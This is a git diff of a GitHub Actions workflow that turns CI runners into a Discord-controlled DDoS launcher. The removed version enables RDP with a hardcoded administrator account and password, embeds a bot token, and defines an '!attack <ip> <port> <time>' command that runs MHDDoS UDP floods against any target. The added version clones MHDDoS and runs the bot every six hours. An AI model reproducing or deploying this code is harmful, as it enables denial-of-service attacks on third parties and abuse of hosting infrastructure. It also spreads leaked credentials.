@@ -1,116 +1,34 @@
-name: RDP
+name: Discord Bot Runner
 
 on:
-  workflow_dispatch:
+  workflow_dispatch:  # Manuel tetikleme
+  schedule:
+    - cron: '0 */6 * * *'  # Her 6 saatte bir
 
 jobs:
-  secure-rdp:
-    runs-on: windows-latest
-    timeout-minutes: 3600
+  run-bot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360  # 6 saat limit
 
     steps:
-      - name: Enable RDP
-        run: |
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
+    - name: Checkout repository
+      uses: actions/checkout@v3
 
-      - name: Create User
-        run: |
-          $Password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
-          New-LocalUser "rdpuser" -Password $Password -FullName "RDP User" -Description "RDP Access"
-          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser"
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
 
-      - name: Get IP Address
-        run: |
-          $IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.PrefixOrigin -eq 'Dhcp'}).IPAddress
-          Write-Output "IP Address: $IP"
-          Write-Output "Username: rdpuser"
-          Write-Output "Password: P@ssw0rd123!"
+    - name: Clone MHDDoS
+      run: git clone https://github.com/MatrixTM/MHDDoS.git
 
-      - name: Install Dependencies
-        run: |
-          python -m pip install --upgrade pip
-          python -m pip install discord.py requests
+    - name: Install dependencies
+      run: |
+        cd MHDDoS
+        pip install -r requirements.txt
+        pip install -r ../requirements.txt
 
-      - name: Setup MHDDoS
-        run: |
-          cd $env:USERPROFILE
-          git clone https://github.com/MHProDev/MHDDoS.git
-          cd MHDDoS
-          python -m pip install -r requirements.txt
-
-      - name: Start Bot and Keep Alive
-        shell: pwsh
-        run: |
-          $code = @'
-          import discord
-          import asyncio
-          import subprocess
-          import os
-          import time
-
-          TOKEN = 'MTQzMDYyNzc2OTMxNzk4NjM4NQ.G_VIV5.otgPTwQ92MRF-gzXUhVtcT4WOLCwggjAeD0nuk'
-
-          intents = discord.Intents.default()
-          intents.message_content = True
-          client = discord.Client(intents=intents)
-
-          processes = []
-
-          @client.event
-          async def on_ready():
-              print(f'Bot online: {client.user}')
-              print('Bot is ready and listening...')
-
-          @client.event
-          async def on_message(message):
-              if message.author == client.user:
-                  return
-              
-              if message.content.startswith('!attack'):
-                  parts = message.content.split()
-                  if len(parts) != 4:
-                      await message.channel.send('Usage: !attack <ip> <port> <time>')
-                      return
-                  
-                  ip = parts[1]
-                  port = parts[2]
-                  time_duration = parts[3]
-                  
-                  await message.channel.send(f'Starting attack on {ip}:{port} for {time_duration}s')
-                  
-                  try:
-                      mhddos_path = os.path.join(os.environ['USERPROFILE'], 'MHDDoS')
-                      proc = await asyncio.create_subprocess_shell(
-                          f'python start.py UDP {ip}:{port} 5 {time_duration}',
-                          cwd=mhddos_path,
-                          stdout=asyncio.subprocess.PIPE,
-                          stderr=asyncio.subprocess.PIPE
-                      )
-                      processes.append(proc)
-                      await message.channel.send('Attack started successfully!')
-                  except Exception as e:
-                      await message.channel.send(f'Error: {str(e)}')
-              
-              elif message.content == '!stop':
-                  for proc in processes:
-                      try:
-                          proc.terminate()
-                      except:
-                          pass
-                  processes.clear()
-                  await message.channel.send('All attacks stopped!')
-
-          print('Starting bot...')
-          while True:
-              try:
-                  client.run(TOKEN)
-              except Exception as e:
-                  print(f'Bot error: {e}')
-                  print('Restarting in 5 seconds...')
-                  time.sleep(5)
-          '@
-          $code | Out-File -FilePath "$env:USERPROFILE\bot.py" -Encoding utf8
-          python "$env:USERPROFILE\bot.py"
+    - name: Run Discord Bot
+      env:
+        DISCORD_TOKEN: ${{ secrets.DISCORD_TOKEN }}  # Secret'tan al
+      run: python bot.py
